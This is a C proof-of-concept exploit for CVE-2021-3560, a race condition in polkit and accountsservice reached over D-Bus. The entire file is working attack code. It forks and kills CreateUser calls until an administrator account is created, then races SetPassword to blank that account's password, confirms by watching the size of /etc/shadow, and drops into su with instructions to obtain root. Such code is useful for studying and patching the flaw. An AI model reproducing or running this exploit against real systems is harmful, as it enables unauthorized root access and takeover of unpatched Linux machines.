// C based PoC for CVE-2021-3560 found by Kevin Backhouse
#include <dbus/dbus.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <pwd.h>
#include <sys/stat.h>
#include <time.h>


#define DEST "org.freedesktop.Accounts"

#define PATH "/org/freedesktop/Accounts"
#define INTERFACE "org.freedesktop.Accounts"
#define METHOD "CreateUser"

#define _PATH2 "/org/freedesktop/Accounts/User%d"
#define INTERFACE2 "org.freedesktop.Accounts.User"
#define METHOD2 "SetPassword"

#define USER "pwned-%d"
#define SHADOW_FILE "/etc/shadow"

void create_user(char *, unsigned int);
void set_password(char *, unsigned int, unsigned int);
dbus_bool_t build_message(DBusMessage*, char *, int);
int is_empty_password_set(long int *);
void launch_shell(char *);
void print_error_and_exit();

DBusError dbus_error;

int main(int argc, char* argv[]) {
	char user[40];
	unsigned int uid = 1337;
	unsigned int delay = 0;
	unsigned int max_delay = 0;
	long int shadow_size = 0;
	int empty_password_set = 0;

	char * password = ""; // empty password
	struct passwd *passwd_user;
	
	sprintf(user, USER, (int)time(NULL));
	printf("[*] creating \"%s\" user ...\n", user);

	do {
		if (fork() == 0) {
			create_user(user, delay);
		}
		wait(NULL);
		passwd_user = getpwnam(user);
	} while (passwd_user == NULL && ++delay);
	
	
	if (passwd_user == NULL) {
        	puts("[!] seems the exploit didnt work, user not created, aborting ...");
        	return 1;
	} else {
		uid = passwd_user->pw_uid;
		max_delay = delay + 1000;
		delay = 0;
	}
	
	puts("[!] user has been created!");
	printf("[*] user: %s, uid: %d\n", user, uid);
	printf("[*] setting an empty password for \"%s\" user..\n", user);
		
	sleep(2); // accountsservice needs some time to recognize the new account, otherwise it will return "no user"
	
	do {
		if (fork() == 0) {
			set_password(password, uid, delay);
		}
		++delay;
		wait(NULL);
		empty_password_set = is_empty_password_set(&shadow_size);
	} while (!empty_password_set && delay < max_delay);
	
	if (!empty_password_set) {
		printf("[!] couldn't set an empty password for \"%s\" user, try again!\n", user);
		return 1;
	}
	
	printf("[*] an empty password has been set for \"%s\" user!\n", user);
	printf("[!] run: \"sudo su root\" as \"%s\" user to get root\n", user);
	
	launch_shell(user);
	
	return 0;
} 

void create_user(char *user, unsigned int delay) {
	DBusConnection * dbus_connection;
	DBusMessage * dbus_message;
	
	unsigned int pid = getpid();
	
	dbus_error_init(&dbus_error);
	
        dbus_connection = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_error);
        if (!dbus_connection)
        	print_error_and_exit();


	dbus_message = dbus_message_new_method_call(NULL, PATH, INTERFACE, METHOD);
	if (!dbus_message)
		print_error_and_exit();
	
	if ( !dbus_message_set_destination(dbus_message, DEST) ) {
		fprintf(stderr, "Error while setting destination: Out Of Memory\n");
       	         exit(0);
	}
	
	if ( !build_message(dbus_message, user, 1) ) {
		fprintf(stderr, "Error: while building message: Out Of Memory\n");
                exit(0);
	}
	dbus_connection_flush(dbus_connection);
	dbus_connection_send_with_reply_and_block(dbus_connection, dbus_message, delay, &dbus_error);
	kill(pid, 9);
}

void set_password(char * password, unsigned int uid, unsigned int delay) {
	DBusConnection * dbus_connection;
	DBusMessage * dbus_message;
	
	char PATH2[40];
	sprintf(PATH2, _PATH2, uid);
	
	unsigned int pid = getpid();
	
	dbus_error_init(&dbus_error);
	
        dbus_connection = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_error);
        if (!dbus_connection)
        	print_error_and_exit();


	dbus_message = dbus_message_new_method_call(NULL, PATH2, INTERFACE2, METHOD2);
	if (!dbus_message)
		print_error_and_exit();
	
	if ( !dbus_message_set_destination(dbus_message, DEST) ) {
		fprintf(stderr, "Error while setting destination: Out Of Memory\n");
		exit(0);
	}
	
	if ( !build_message(dbus_message, password, 0) ) {
		fprintf(stderr, "Error while building message: Out Of Memory\n");
		exit(0);
	}

	dbus_connection_flush(dbus_connection);
	dbus_connection_send_with_reply_and_block(dbus_connection, dbus_message, delay, &dbus_error);
	kill(pid, 9);
}

dbus_bool_t build_message(DBusMessage* message, char *argument, int create_user) {
	DBusMessageIter arguments;
	dbus_bool_t success = 1;

	dbus_message_iter_init_append(message, &arguments);
	
   	success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &argument);
   	success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_STRING, &argument);
   	if (create_user) {
   		int account_type = 1; // 0: standard user, 1: adminstrator user
   		success &= dbus_message_iter_append_basic(&arguments, DBUS_TYPE_INT32, &account_type);
	}
	return success;
}

int is_empty_password_set(long int *shadow_size) {
	struct stat shadow_stat;
	int error;
	
	error = stat(SHADOW_FILE, &shadow_stat);
	if (error != 0) {
		puts("[!] an error detected while checking the size of the shadow file!");
		return 0;
	}
	if (*shadow_size == 0) {
		*shadow_size = shadow_stat.st_size;
	}
	
	return (shadow_stat.st_size == *shadow_size - 1);
}

void launch_shell(char *user) {
	char * cmd = "/usr/bin/su";
	char *args[3] = {"-", user, NULL};
	
	execv(cmd, args);
}

void print_error_and_exit() {
	if (dbus_error_is_set(&dbus_error)) {
		fprintf(stderr, "Error: %s\n", dbus_error.message);
		dbus_error_free(&dbus_error);
		exit(1);
	}
	fprintf(stderr, "Unknown error occured\n");
	exit(1);
}
